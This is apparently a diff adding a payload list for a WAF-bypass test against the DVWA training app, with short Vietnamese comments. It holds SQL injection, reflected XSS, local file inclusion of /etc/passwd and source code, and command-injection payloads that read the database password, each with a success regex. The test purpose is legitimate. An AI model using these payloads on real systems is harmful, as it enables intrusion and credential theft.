@@ -1,0 +1,17 @@
+# Bien the payload de thu kha nang lot qua WAF o PL1. Dinh dang giong CASES trong attack.sh:
+# ten|phuong thuc|duong dan|du lieu POST|dau hieu khai thac thanh cong (regex)
+sqli-comment|GET|/vulnerabilities/sqli/?id=1%27%2F**%2FOR%2F**%2F%271%27%3D%271&Submit=Submit||Surname: Brown
+sqli-pipes|GET|/vulnerabilities/sqli/?id=1%27%20%7C%7C%20%271%27%3D%271&Submit=Submit||Surname: Brown
+sqli-like|GET|/vulnerabilities/sqli/?id=1%27%20OR%20%27a%27%20LIKE%20%27a&Submit=Submit||Surname: Brown
+sqli-dblenc|GET|/vulnerabilities/sqli/?id=1%2527%2520OR%2520%25271%2527%253D%25271&Submit=Submit||Surname: Brown
+xss-case|GET|/vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert(1)%3C%2FsCrIpT%3E||<ScRiPt>alert\(1\)
+xss-svg|GET|/vulnerabilities/xss_r/?name=%3Csvg%2Fonload%3Dalert(1)%3E||<svg/onload=alert\(1\)>
+xss-img|GET|/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E||<img src=x onerror=alert\(1\)>
+lfi-abs|GET|/vulnerabilities/fi/?page=/etc/passwd||root:x:0:0
+lfi-hosts|GET|/vulnerabilities/fi/?page=/etc/hosts||127\.0\.0\.1\s+localhost
+lfi-filter|GET|/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php||PD9waHA
+cmdi-id|POST|/vulnerabilities/exec/|ip=127.0.0.1%3Bid&Submit=Submit|uid=33
+cmdi-pipe|POST|/vulnerabilities/exec/|ip=127.0.0.1%7Cid&Submit=Submit|uid=33
+cmdi-newline|POST|/vulnerabilities/exec/|ip=127.0.0.1%0Aid&Submit=Submit|uid=33
+cmdi-pwd|POST|/vulnerabilities/exec/|ip=127.0.0.1%3Bpwd&Submit=Submit|/var/www/html/vulnerabilities/exec
+cmdi-config|POST|/vulnerabilities/exec/|ip=127.0.0.1%3Bcat%20..%2F..%2Fconfig%2Fconfig.inc.php&Submit=Submit|db_password
